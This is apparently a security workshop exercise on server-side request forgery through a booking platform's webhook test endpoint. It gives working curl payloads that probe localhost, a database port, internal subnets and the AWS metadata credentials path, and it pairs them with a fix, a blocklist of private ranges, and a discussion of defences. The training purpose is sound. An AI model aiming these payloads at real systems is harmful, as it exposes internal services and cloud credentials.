# Exercise 08 — Server-Side Request Forgery (SSRF): Webhook Test

**Difficulty:** Intermediate  
**Category:** Server-Side Request Forgery  
**OWASP Top 10:** A10:2021 — Server-Side Request Forgery  
**Config flag:** `BookingDojo:Workshop:WebhookSsrf`

---

## Scenario

Partners can register a webhook URL to receive booking events. The platform provides a "Test Webhook" endpoint (`POST /api/webhooks/test`) that sends a sample payload to the supplied URL and reports back the response. Because the server makes this outbound HTTP request on the caller's behalf, any URL the attacker supplies becomes a request **from the server's network perspective** — not the client's. This allows probing internal services that are not accessible from the public internet.

---

## Background

**Server-Side Request Forgery (SSRF)** occurs when an attacker can cause the server to make an HTTP request to an attacker-controlled target. Because the request originates from the server's network:

- Internal services (databases, admin APIs, Kubernetes API, Redis) that only listen on `127.0.0.1` or private subnets become reachable
- Cloud metadata endpoints (`169.254.169.254`) leak IAM credentials and configuration
- Firewall rules that protect internal services from the public internet are bypassed
- Internal IP ranges and hostnames that are invisible from outside the network become accessible

Common SSRF entry points: webhook URL fields, image/avatar fetch-by-URL, PDF generation from user-supplied URLs, import-from-URL features, integrations that "ping" external services.

---

## Step 1 — Exploit SSRF via the UI

Log in as `partner / Partner1234!` and navigate to **Integrations**.

The page has two sections: **Webhooks** (save a URL permanently) and **Test a URL** (one-off probe). Use **Test a URL** for the attacks below — the server response is shown directly in the browser.

### Probe the local API

In the **URL** field under **Test a URL**, enter:

```
http://localhost:5000/api/auth/login
```

Click **Send Test**. The server response panel shows the API's own login endpoint response — confirming the internal service is reachable from the server's network even though your browser couldn't reach `localhost:5000` directly (it would hit your machine, not the server's loopback).

### Probe the database port

Enter:

```
http://localhost:5432/
```

Click **Send Test**. The response shows PostgreSQL's greeting banner or a connection error — either way confirming the database host and port from outside the network.

### Cloud metadata endpoint

Enter:

```
http://169.254.169.254/latest/meta-data/
```

Click **Send Test**. On AWS this returns IAM role names. In the workshop environment you'll see a connection timeout or refused — but on a real cloud instance this returns credentials.

All three probes show the server's response rendered in the browser with no extra tools required.

---

## Step 2 — Normal webhook test via curl

A legitimate webhook test to an external server:

```bash
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"https://webhook.site/your-unique-id"}' | jq .
```

The server POSTs `{"event":"booking.created","test":true}` to the URL and returns the response status and body.

---

## Step 3 — Probe the database port via curl

The PostgreSQL database listens on `localhost:5432`. From the internet, it is unreachable. From the server's loopback interface, it is:

```bash
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:5432/"}' | jq .
```

Expected: the server connects to port 5432 and returns whatever PostgreSQL sends in its greeting banner, or an error indicating the port is open. Either way, the attacker has **confirmed the database host and port** from outside the network.

---

## Step 4 — Cloud metadata endpoint via curl

On AWS (and compatible clouds), the instance metadata service at `169.254.169.254` returns IAM role credentials, user data scripts, and configuration — all accessible without any authentication from within the instance:

```bash
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' | jq .

# If IMDSv1 is enabled, this leaks the IAM role name:
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' | jq .
```

The credentials returned include `AccessKeyId`, `SecretAccessKey`, and a `Token` — full programmatic access to the AWS account.

---

## Step 5 — Probe internal subnets

In a real deployment, other internal services live on RFC 1918 ranges:

```bash
# Internal admin API
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.0.1.5:8080/admin/status"}' | jq .

# Kubernetes API server (common default port)
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"https://10.96.0.1/api/v1/namespaces"}' | jq .
```

---

## Step 6 — Apply the fix

In `appsettings.json`:

```json
"WebhookSsrf": "Fixed"
```

Restart the API and repeat the internal probes:

```bash
# All of these now return 400 Bad Request
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:5000/api/auth/login"}' | jq .

curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' | jq .

curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://10.0.1.5:8080/admin"}' | jq .
```

The fixed validation rejects:
- Non-HTTPS schemes (`http://`)
- Loopback addresses (`localhost`, `127.0.0.1`, `::1`)
- Private IP ranges (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)
- Link-local addresses (`169.254.0.0/16`)
- Internal hostnames (`.internal`, `.local`)

A valid HTTPS public URL still works:

```bash
curl -s -b cookies.txt -X POST http://localhost:5001/bff/webhooks/test \
  -H "Content-Type: application/json" \
  -d '{"url":"https://webhook.site/your-unique-id"}' | jq .
```

---

## Step 7 — How it works at runtime

```
POST /bff/webhooks/test {"url": "http://169.254.169.254/latest/meta-data/"}
        │
        ▼
WebhooksController.TestWebhook(url)
        │
        ├─ Vulnerable: no URL validation
        │       │
        │       ▼
        │  HttpClient.PostAsync("http://169.254.169.254/...")
        │       │
        │       └─► request originates from the SERVER'S network
        │           firewall sees: server → internal metadata service (allowed)
        │           response: IAM role name, credentials, instance config
        │           returned to attacker in HTTP response body
        │
        └─ Fixed: URL validated before fetch
                │
                ▼
           Is scheme HTTPS? Is host public? Is IP non-private?
                │
                ├─ fails any check → 400 Bad Request, no outbound request made
                └─ passes all checks → HttpClient.PostAsync(url) → external only
```

## Step 8 — Discussion

| Defence | Description | Limitations |
|---------|-------------|-------------|
| URL allowlist (known domains only) | Only specific partner-registered domains are callable | Must maintain list; partners can register malicious domains |
| IP blocklist (private ranges + loopback) | Block RFC 1918, link-local, loopback | DNS rebinding can bypass; dual-stack IPv6 gaps |
| DNS resolution before fetch | Resolve hostname → validate IP → then fetch | Requires re-validation on every redirect |
| Outbound firewall / egress filtering | Network-level block of private ranges | Defence-in-depth, not sufficient alone |
| Metadata service IMDSv2 | AWS: require signed token for metadata access | Doesn't prevent SSRF to other internal services |

**DNS rebinding (SSRF bypass)**

A clever attacker can register `evil.example.com` with a public IP, pass the validation, then change the DNS record to `127.0.0.1` before the actual fetch resolves. The fix: resolve the hostname to an IP **at validation time** and check that IP against the blocklist, then use the resolved IP for the actual connection (not the hostname again).

**Redirects**

If the external server responds with `HTTP 301 → http://169.254.169.254/`, a naive implementation follows the redirect to the internal address. Fix: disable redirect following, or re-validate each redirect target.

---

## Key Takeaways

- **The firewall protects from the internet, not from the server.** Requests from the server bypass external network controls.
- **Cloud metadata is a critical SSRF target.** IAM credentials from `169.254.169.254` mean complete cloud account compromise.
- **Any URL-accepting feature is a potential SSRF vector.** Webhooks, avatars, imports, PDF renderers, link previews.
- **The fix is URL validation before the first DNS lookup.** Validation after fetch is too late.

---

## Further Reading

- [OWASP A10:2021 — Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [AWS IMDSv2 — Requiring signed token for instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
